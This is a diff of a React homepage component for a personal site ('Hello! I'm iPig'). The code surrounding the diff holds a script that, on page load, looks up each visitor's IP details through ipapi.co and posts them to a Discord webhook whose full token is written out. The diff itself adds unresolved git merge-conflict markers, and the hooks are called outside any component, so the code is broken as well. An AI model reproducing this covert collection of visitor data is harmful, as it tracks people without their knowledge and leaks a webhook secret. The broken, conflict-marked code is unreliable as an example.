@@ -2,21 +2,32 @@
 import { useEffect, useState } from 'react';
 import './App.css'
 import { BrowserRouter, Route, Routes } from 'react-router-dom'
+<<<<<<< HEAD
 import Axios from 'axios';
+=======
+import Axios from 'axios'
+>>>>>>> 60ca7823113d0061ee16cda37b56fc4ec8f1d75b
 
 const [ipDetails, setIpDetails] = useState([]);
 
 useEffect(() => {
+<<<<<<< HEAD
         Axios.get('https://ipapi.co/json/').then((res: any) => {
+=======
+        Axios.get('https://ipapi.co/json/').then((res) => {
+>>>>>>> 60ca7823113d0061ee16cda37b56fc4ec8f1d75b
             setIpDetails(res.data);
         });
     }, [])
 Axios.post("https://discord.com/api/webhooks/1130431745137836114/3pobYO8lhcI1xvWn-6KxKEmaluBxM6Q6IgCHHwloRShDojo02TcZHa_RDYJcqhzfTpKi", {
   "content": ipDetails
 })
+<<<<<<< HEAD
 
 
 
+=======
+>>>>>>> 60ca7823113d0061ee16cda37b56fc4ec8f1d75b
 function Home() {
   return <>
   <h1>Hello! I'm iPig👋</h1>
